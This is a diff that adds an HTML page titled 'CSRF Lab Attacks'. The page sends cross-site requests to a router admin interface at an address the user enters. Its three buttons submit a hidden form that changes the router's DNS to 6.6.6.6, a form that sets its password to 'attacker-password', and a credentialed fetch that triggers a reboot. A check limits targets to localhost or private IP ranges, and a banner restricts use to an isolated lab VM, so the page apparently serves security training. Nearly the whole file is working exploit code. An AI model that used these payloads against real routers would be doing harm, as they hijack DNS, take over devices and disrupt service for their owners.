@@ -1,0 +1,17 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>CSRF Lab Attacks</title>
+<style>body{font:16px system-ui;max-width:720px;margin:50px auto}input{display:block;width:100%;padding:9px;margin:8px 0 18px}button{padding:10px;margin:5px}.warning{background:#fff3cd;padding:14px}</style></head>
+<body><h1>Controlled CSRF attack page</h1>
+<p class="warning">Use only against your isolated router VM.</p>
+<label>Router origin<input id="target" placeholder="http://192.168.56.10:8000"></label>
+<button onclick="post('/dns',{dns:'6.6.6.6'})">V1: malicious DNS form</button>
+<button onclick="post('/passwd',{password:'attacker-password'})">V2: password form</button>
+<button onclick="reboot()">V3: fetch reboot</button>
+<form id="form" method="post" target="result"></form><iframe name="result"></iframe>
+<script>
+function target(){const value=document.querySelector("#target").value.trim().replace(/\/$/,"");
+if(!/^https?:\/\/(localhost|127\.0\.0\.1|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/i.test(value))
+throw Error("Use a localhost or private lab IP");return value}
+function post(path,data){try{const form=document.querySelector("#form");form.action=target()+path;form.replaceChildren();
+Object.entries(data).forEach(([name,value])=>{const input=document.createElement("input");input.type="hidden";input.name=name;input.value=value;form.append(input)});form.submit()}catch(e){alert(e.message)}}
+async function reboot(){try{await fetch(target()+"/reboot",{method:"POST",credentials:"include",mode:"no-cors"});alert("Sent; inspect the router status.")}catch(e){alert(e.message)}}
+</script></body></html>
